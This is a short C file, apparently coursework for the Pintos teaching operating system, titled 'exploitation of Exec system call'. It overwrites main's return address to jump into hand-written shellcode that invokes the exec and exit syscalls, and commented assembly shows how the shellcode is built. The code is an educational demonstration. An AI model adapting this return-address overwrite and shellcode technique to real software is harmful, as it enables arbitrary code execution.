//exploitation of Exec system call
//Ngwe Sandar Linn 21003873


#include<syscall.h>

//shellcode in hexadecimal representation of the assembly code below 
char shellcode[] =
  "\xE9\x0A\x00\x00\x00\x6A\x02\xCD\x30\x6A\x00\x6A\x01\xCD\x30\xE8\xF1\xFF\xFF\xFF""syscall_test";

int main(void)
{
  #if 1
    int *ret;               /* A local variable is stored on the stack. */

    ret = (int*)&ret + 2;   /* Two steps above in the stack is the
                            * address to continue at when main
                            * return... the normal function return
                            * address. */

    (*ret) = (int)shellcode; /* Overwrite with the address to the shellcode*/
    
    //exec("test");
    return 1;
  

  #else

    /* Assembler code to do the following:
   *
   *  exec("crack");
   *  exit();
   *
   * Apparently the code 0x01 can not be sent as input to pintos, so
   * it can not be part of any instruction. Reason unknown. Theory:
   * 0x01 may be grabbed as Ctrl-a by QEMU ?
   *
   * Translate push 0x01 ==> ... push %eax
   *
   * The tricky part is to figure out at which address the name of the
   * program to start is stored. The call instruction solves it
   * nicely. It saves the following address as return address.
   */


  __asm__("jmp    0x0f;"             /* jump to CALL */
    /* actual address of string pushed as return address by CALL */
          "push   $0x2;"             /* push EXEC syscall number */
          "int    $0x30;"            /* make syscall */
          "xor    %eax,%eax;"        /* load 0 in eax */
          "push   %eax;"             /* push exit_status */
          "inc    %eax;"             /* inc eax to 1 */
          "push   %eax;"             /* push EXIT syscall number */
          "int    $0x30;"            /* make syscall */
    /* CALL */"call   -0x0C;"            /* jumps back again */
          ".string \"syscall_test\";"       /* program to start */

    
    );

     
  #endif
}